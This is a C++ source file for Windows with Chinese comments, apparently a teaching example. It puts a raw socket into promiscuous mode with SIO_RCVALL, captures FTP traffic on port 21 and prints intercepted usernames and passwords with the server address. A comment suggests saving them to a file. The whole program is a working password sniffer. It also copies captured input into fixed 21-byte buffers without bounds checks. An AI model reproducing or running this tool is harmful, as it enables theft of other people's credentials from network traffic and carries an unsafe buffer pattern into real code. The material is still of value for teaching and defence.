/////////////////////////////////////////////////
// PasswordMonitor.cpp文件

#include "../common/initsock.h"
#include "../common/protoinfo.h" 

#include <stdio.h>
#include <mstcpip.h>

#pragma comment(lib, "Advapi32.lib")

CInitSock theSock;



void GetFtp(char *pData, DWORD dwDestIp)
{
	char szBuf[256];
	static char szUserName[21];
	static char szPassword[21];

	if(strnicmp(pData, "USER ", 5) == 0)
	{
		sscanf(pData + 4, "%*[ ]%s", szUserName);	
	}
	else if(strnicmp(pData, "PASS ", 5) == 0)
	{
		sscanf(pData + 4, "%*[ ]%s", szPassword);

		wsprintf(szBuf, " Server Address: %s; User Name: %s; Password: %s; \n\n", 
								::inet_ntoa(*(in_addr*)&dwDestIp), szUserName, szPassword);

		printf(szBuf);	// 这里您可以将它保存到文件中
	}
}


void DecodeIPPacket(char *pData)
{
	IPHeader *pIPHdr = (IPHeader*)pData;


	int nHeaderLen = (pIPHdr->iphVerLen & 0xf) * sizeof(ULONG);

	switch(pIPHdr->ipProtocol)
	{
	case IPPROTO_TCP:
		{
			TCPHeader *pTCPHdr = (TCPHeader *)(pData + nHeaderLen);
			switch(::ntohs(pTCPHdr->destinationPort))
			{
			case 21:	// ftp协议
				{
					GetFtp((char*)pTCPHdr + sizeof(TCPHeader), pIPHdr->ipDestination);
				}
				break;

			case 80:	// http协议...
			case 8080:
				
				break;
			}
		}
		break;
	case IPPROTO_UDP:
		break;
	case IPPROTO_ICMP:
		break; 
	}
}


void main()
{
	// 创建原始套节字
	SOCKET sRaw = socket(AF_INET, SOCK_RAW, IPPROTO_IP);

	// 获取本地IP地址
	char szHostName[56];
	SOCKADDR_IN addr_in;
	struct  hostent *pHost;
	gethostname(szHostName, 56);
	if((pHost = gethostbyname((char*)szHostName)) == NULL)	
		return ;

	// 在调用ioctl之前，套节字必须绑定
	addr_in.sin_family  = AF_INET;
	addr_in.sin_port    = htons(0);
	memcpy(&addr_in.sin_addr.S_un.S_addr, pHost->h_addr_list[0], pHost->h_length);

	printf(" Binding to interface : %s \n", ::inet_ntoa(addr_in.sin_addr));
	if(bind(sRaw, (PSOCKADDR)&addr_in, sizeof(addr_in)) == SOCKET_ERROR)
		return;

	// 设置SIO_RCVALL控制代码，以便接收所有的IP包	
	DWORD dwValue = 1;
	if(ioctlsocket(sRaw, SIO_RCVALL, &dwValue) != 0)	
		return ;
	
	// 开始接收封包
	printf(" \n\n begin to monitor ftp password... \n\n");
	char buff[1024];
	int nRet;
	while(TRUE)
	{
		nRet = recv(sRaw, buff, 1024, 0);
		if(nRet > 0)
		{
			DecodeIPPacket(buff);
		}
	}
	closesocket(sRaw);
}

